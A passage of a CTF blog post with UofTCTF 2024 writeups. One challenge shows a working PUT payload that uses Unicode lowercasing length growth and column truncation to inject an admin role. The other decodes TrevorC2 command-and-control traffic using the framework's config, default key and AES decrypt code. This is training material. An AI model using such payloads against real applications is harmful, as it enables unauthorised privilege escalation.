</span></pre></table></code></div></div><p>This however, will not work because <code class="language-plaintext highlighter-rouge">JSON.parse()</code> will take the last value of role to be true, so it will overwrite our injected <code class="language-plaintext highlighter-rouge">"role": "admin"</code> value.</p><p>We can bypass this though by looking at the database specification.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">users</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
    <span class="n">username</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="n">password</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="k">data</span> <span class="n">NVARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Notice that the field we are storing to (<code class="language-plaintext highlighter-rouge">data</code>) is maximum length of 255. If we have data greater in length than this, then it will be truncated and we can slice off the part which defines our role as user! Unfortunately, there are length checks on <code class="language-plaintext highlighter-rouge">phone</code> (must be 10) and <code class="language-plaintext highlighter-rouge">credit_card</code> (must be 16) and these both must be numbers so we can’t do much there. Under <code class="language-plaintext highlighter-rouge">secret_question</code> and <code class="language-plaintext highlighter-rouge">secret_answer</code> we are also limited to just 45 each. In total, that is around 150 characters when including all the curly braces and quotation.</p><p>You will however, notice that there is a call to <code class="language-plaintext highlighter-rouge">String.toLowerCase()</code> on the convert function. This is great, because there is one single character in javascript (<code class="language-plaintext highlighter-rouge">İ</code>) which has a length of 1 but after passing through the <code class="language-plaintext highlighter-rouge">String.toLowerCase()</code> function its length becomes 2.</p><p>So we <code class="language-plaintext highlighter-rouge">PUT /profile</code> with the following payload:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"phone"</span><span class="p">:</span><span class="s2">"1111111111"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"credit_card"</span><span class="p">:</span><span class="s2">"1111111111111111"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"secret_question"</span><span class="p">:</span><span class="s2">"İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"secret_answer"</span><span class="p">:</span><span class="s2">"İİİİİİİİİİİİİİİİİİİİİİİİ</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">role</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">admin</span><span class="se">\"</span><span class="s2">}"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"current_password"</span><span class="p">:</span><span class="s2">";)"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>And we log back in and fetch our flag! Hope you enjoyed the writeups.</p><h2 id="forensicsillusion-writeup"><span class="mr-2">forensics/Illusion Writeup</span><a href="#forensicsillusion-writeup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’re given a PCAP file with a lot of traffic to and from one IP address. Looking into it, its mainly http traffic, with some calls to a cloned Google.com page, and a get request for an image. The requests to the images caught my interest, as they don’t return any image data, just a 200OK.</p><p><img data-src="https://i.ibb.co/8gWC5Dw/wireshark.png" alt="Wireshark traffic" data-proofer-ignore> The GUID string looks like base64, but doesn’t decode to anything.</p><p>After a bit of Googling I came across this <a href="https://nasbench.medium.com/understanding-detecting-c2-frameworks-trevorc2-2a9ce6f1f425">Medium blog</a> talking about the trevorC2 Framework. In this post it mentions how the C2 framework will clone a webpage like Google.com, then it will send the C2 server data through the /images?guid parameter. Heres the config for the C2 Server.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="n">URL</span> <span class="o">=</span> <span class="p">(</span><span class="s">"https://www.google.com"</span><span class="p">)</span>  <span class="c1"># URL to clone to house a legitimate website
</span><span class="n">USER_AGENT</span> <span class="o">=</span> <span class="p">(</span><span class="s">"User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"</span><span class="p">)</span>
<span class="n">ROOT_PATH_QUERY</span> <span class="o">=</span> <span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
<span class="c1"># THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
</span><span class="n">SITE_PATH_QUERY</span> <span class="o">=</span> <span class="p">(</span><span class="s">"/images"</span><span class="p">)</span>
<span class="c1"># THIS IS THE QUERY STRING PARAMETER USED
</span><span class="n">QUERY_STRING</span> <span class="o">=</span> <span class="p">(</span><span class="s">"guid="</span><span class="p">)</span>
<span class="c1"># THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONID
</span><span class="n">COOKIE_SESSIONID_STRING</span> <span class="o">=</span> <span class="p">(</span><span class="s">"sessionid"</span><span class="p">)</span>
<span class="c1"># THIS IS THE LENGTH OF THE COMMUNICATION SESSIONID
</span><span class="n">COOKIE_SESSIONID_LENGTH</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span><span class="p">)</span>
<span class="c1"># STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
</span><span class="n">STUB</span> <span class="o">=</span> <span class="p">(</span><span class="s">"oldcss="</span><span class="p">)</span>
<span class="c1"># Turn to True for SSL support
</span><span class="n">SSL</span> <span class="o">=</span> <span class="bp">False</span>
<span class="n">CERT_FILE</span> <span class="o">=</span> <span class="p">(</span><span class="s">""</span><span class="p">)</span>  <span class="c1"># Your Certificate for SSL
# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
</span><span class="n">CIPHER</span> <span class="o">=</span> <span class="p">(</span><span class="s">"Tr3v0rC2R0x@nd1s@w350m3#TrevorForget"</span><span class="p">)</span>
<span class="c1"># Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
</span><span class="n">NOTFOUND</span><span class="o">=</span><span class="p">(</span><span class="s">"Page not found."</span><span class="p">)</span>
<span class="c1"># Redirect the victim if browsing website to the cloned URL instead of presenting it. ON/OFF
</span><span class="n">REDIRECT</span> <span class="o">=</span><span class="p">(</span><span class="s">"ON"</span><span class="p">)</span>
</pre></table></code></div></div><p>This all matches what we found in the PCAP. So it’s safe to assume its using the TrevorC2 to communicate.</p><p>Looking at the <a href="https://github.com/trustedsec/trevorc2">source code</a> we can see that to decode the transferred data we need to base64 decode it, then decrypt the AES.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">bs</span> <span class="o">=</span> <span class="mi">16</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">AESCipher</span><span class="p">.</span><span class="n">str_to_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)).</span><span class="n">digest</span><span class="p">()</span>
<span class="p">...</span>
<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">enc</span><span class="p">):</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[:</span><span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">]</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">_unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">:])).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
</pre></table></code></div></div><p>From this snippet we know that the IV is the first 16 bytes of the data, and the cipher is the sha256 of the key, which was <code class="language-plaintext highlighter-rouge">Tr3v0rC2R0x@nd1s@w350m3#TrevorForget</code>.</p><p>Using this information we can use cyberchef to make a recipe to decode the GUID data, we had to use 2 Base64 decodes rather than one. I’m assuming this is from the client base64 encoding it to send over HTTP. However, the flag is not in any of the exfil data. We do find that a flag.txt was created on the analysts desktop. As well as other traffic showing that there was a reverse shell on the system. <img data-src="https://i.ibb.co/SwNC5Cq/cyberchef.png" alt="CyberchefRecipe" data-proofer-ignore></p><p>The next step was the decode the instructions from the C2, to see if any of the commands contain the flag. The instructions from the C2 are taken from a commented stub at the bottom of the cloned Google pages. <img data-src="https://i.ibb.co/99188Sk/oldcsstag.png" alt="oldcss tag" data-proofer-ignore></p><p>The C2 Instructions are encoded similar to the the guid data, but there is only 1 base64 encoding. There’s a lot of requests with the oldcss stub, so I exported all the HTML objects, and then used grep to find all the matches. <img data-src="https://i.ibb.co/QJ6s9RQ/grepoldcss.png" alt="Grepping oldcss" data-proofer-ignore></p><p>The longest string caught my attention so I tried that first, and got the flag. <img data-src="https://i.ibb.co/ySz4Km3/flag.png" alt="getting the flag" data-proofer-ignore> <code class="language-plaintext highlighter-rouge">uoftctf{Tr3V0r_C2_1s_H4rd_T0_D3t3c7}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/forensics/" class="post-tag no-text-decoration" >forensics</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=UofTCTF 2024 Challenge Writeups - Ireland.RE&amp;url=https://ireland.re/posts/UofTCTF_2024/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=UofTCTF 2024 Challenge Writeups - Ireland.RE&amp;u=https://ireland.re/posts/UofTCTF_2024/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/UofTCTF_2024/&amp;text=UofTCTF 2024 Challenge Writeups - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TheFewChosen_2023/"><div class="card-body"> <em class="timeago small" data-ts="1690675200" > 2023-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TheFewChosen 2023</h3><div class="text-muted small"><p> Crypto Dizzy We’re given this to decipher: T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24 The...</p></div></div></a></div><div class="card"> <a href="/posts/CursedCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1712275200" > 2024-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CursedCTF 2024</h3><div class="text-muted small"><p> Web - Hero’s Journey Challenge description Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image: So l...</p></div></div></a></div><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/NiteCTF_2023/" class="btn btn-outline-primary" prompt="Older"><p>NiteCTF 2023 Challenges</p></a> <a href="/posts/KalmarCTF_2024/" class="btn btn-outline-primary" prompt="Newer"><p>KalmarCTF 2024 Web Challenges</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
